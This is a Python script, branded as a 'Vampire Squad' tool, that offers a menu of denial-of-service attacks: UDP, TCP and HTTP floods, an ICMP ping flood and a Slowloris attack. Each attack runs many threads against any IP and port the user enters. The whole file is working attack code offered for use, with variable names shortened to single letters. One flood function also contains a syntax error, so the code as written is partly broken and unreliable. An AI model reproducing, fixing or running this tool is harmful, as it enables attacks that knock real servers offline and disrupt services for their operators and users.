#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os as o, socket as s, random as r, threading as t, time as T, sys as S

o.system("clear")
l='''\033[1;31m
         _______      .-'       `-.
        /           \\
        |  .--. .--.  |
        | (    Y    ) |
        (  '--' '--'  )
         \         /
          `._.-._.'

██╗   ██╗ █████╗ ███╗   ███╗██████╗ ██╗██████╗ ███████╗
██║   ██║██╔══██╗████╗ ████║██╔══██╗██║██╔══██╗██╔════╝
██║   ██║███████║██╔████╔██║██████╔╝██║██║  ██║█████╗  
██║   ██║██╔══██║██║╚██╔╝██║██╔═══╝ ██║██║  ██║██╔══╝  
╚██████╔╝██║  ██║██║ ╚═╝ ██║██║     ██║██████╔╝███████╗
 ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚═════╝ ╚══════╝

Author: Muhammad Shourov (Vampire) | Team: Vampire Squad
GitHub: https://github.com/vampiresquad
\033[0m'''

print(l)
print("-" * 60)

def f1(ip, p, th):
    def R(): d=r._urandom(1024);u=s.socket(s.AF_INET,s.SOCK_DGRAM)
    ;[u.sendto(d,(ip,p)) for _ in iter(int,1)]
    [t.Thread(target=R, daemon=True).start() for _ in range(th)]

def f2(ip, p, th):
    def R():
        d=r._urandom(2048)
        while 1:
            try:
                x=s.socket(s.AF_INET,s.SOCK_STREAM)
                x.connect((ip,p));x.send(d);x.close()
            except: pass
    [t.Thread(target=R, daemon=True).start() for _ in range(th)]

def f3(ip, p, th):
    def R():
        while 1:
            try:
                x=s.socket(s.AF_INET,s.SOCK_STREAM)
                x.connect((ip,p))
                x.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode())
                x.close()
            except: pass
    [t.Thread(target=R, daemon=True).start() for _ in range(th)]

def f4(ip, th):
    def R(): [o.system(f"ping -c 1 {ip} > /dev/null") for _ in iter(int,1)]
    [t.Thread(target=R, daemon=True).start() for _ in range(th)]

def f5(ip, p, th):
    def R():
        while 1:
            try:
                x=s.socket(s.AF_INET,s.SOCK_STREAM)
                x.connect((ip,p))
                x.send(f"GET /?{r.randint(0,1000)} HTTP/1.1\r\n".encode())
                x.send(f"Host: {ip}\r\n".encode())
                while 1:
                    x.send("X-a: b\r\n".encode());T.sleep(15)
            except: pass
    [t.Thread(target=R, daemon=True).start() for _ in range(th)]

def M():
    while 1:
        print("\n\033[1;36m[ MENU ]\033[0m")
        print("1. UDP Flood Attack")
        print("2. TCP Flood Attack")
        print("3. HTTP Flood Attack")
        print("4. ICMP Ping Flood")
        print("5. Slowloris Attack")
        print("6. Exit\n")
        c=input("Choose an option (1-6): ").strip()
        if c in ['1','2','3','5']:
            i=input("Enter Target IP: ").strip()
            p=int(input("Enter Target Port: ").strip())
            th=int(input("Number of Threads: ").strip())
            print(f"\n\033[1;32mStarting Attack on {i}:{p} with {th} threads...\033[0m\n")
            T.sleep(1)
            {'1':f1,'2':f2,'3':f3,'5':f5}[c](i,p,th)
        elif c=='4':
            i=input("Enter Target IP: ").strip()
            th=int(input("Number of Threads: ").strip())
            f4(i,th)
        elif c=='6':
            print("\033[1;33mGoodbye, Vampire!\033[0m")
            S.exit()
        else:
            print("\033[1;31mInvalid option. Try again.\033[0m")

M()
